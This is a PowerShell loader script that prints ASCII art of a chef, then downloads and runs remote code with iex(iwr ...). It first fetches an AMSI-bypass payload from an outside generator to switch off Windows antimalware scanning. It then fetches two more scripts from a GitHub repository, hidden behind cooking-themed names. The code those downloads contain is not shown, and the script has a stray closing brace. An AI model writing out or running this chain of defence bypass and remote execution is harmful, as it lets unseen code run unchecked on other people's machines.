write-host @("                                                                                                                                              
                                                                    
    ▓▓▒▒▓▓▒▒▒▒▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                        
  ▒▒    ░░░░░░                        ░░░░░░▓▓                      
  ▒▒░░░░░░░░                            ░░░░▓▓                      
  ▒▒░░░░░░░░░░                          ░░░░▓▓                      
  ▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░▓▓                      
    ▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒                        
    ░░▓▓░░░░░░░░                      ░░▓▓                          
      ▓▓░░░░░░                          ▓▓                          
      ▓▓░░░░░░                          ▓▓                          
      ▓▓░░░░░░                          ▓▓                          
    ░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                          
    ░░▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓                          
    ░░▓▓░░░░░░░░░░▒▒▒▒▒▒░░    ░░▒▒▒▒▒▒░░▓▓                          
    ░░▓▓░░░░░░░░░░      ░░░░░░░░  ░░  ░░▓▓                          
    ░░▓▓▓▓░░░░░░░░████░░░░░░░░░░░░████░░▓▓                          
  ░░▓▓░░░░░░░░░░░░████░░░░░░░░░░░░████░░░░▓▓                        
    ▒▒░░▒▒░░░░░░░░░░▒▒░░░░░░░░░░░░░░░░░░░░▒▒                        
    ▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓                        
    ░░▒▒▒▒░░░░░░▒▒░░░░░░░░░░░░░░░░░░░░░░▒▒                          
    ░░▓▓░░░░░░░░░░▒▒▓▓▒▒▒▒▒▒░░░░░░░░░░░░▓▓                          
        ▓▓░░░░      ░░░░░░░░░░░░░░░░░░▓▓                            
        ▓▓░░░░░░░░  ░░░░░░░░░░░░░░░░░░▓▓                            
          ▓▓░░░░░░░░░░░░░░░░░░░░░░░░▓▓                              
          ░░▒▒▒▒░░░░░░░░░░░░░░░░▒▒▒▒░░                              
                ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒                                                         
")


Function voorverwarming {
    iex((iwr https://amsi-fail.azurewebsites.net/api/Generate).content)
   }
}
voorverwarming
iex((iwr https://raw.githubusercontent.com/justin-p/chefvet/master/partysnacks.ps1).content)
iex((iwr https://raw.githubusercontent.com/justin-p/chefvet/master/frituurpan.ps1).content)
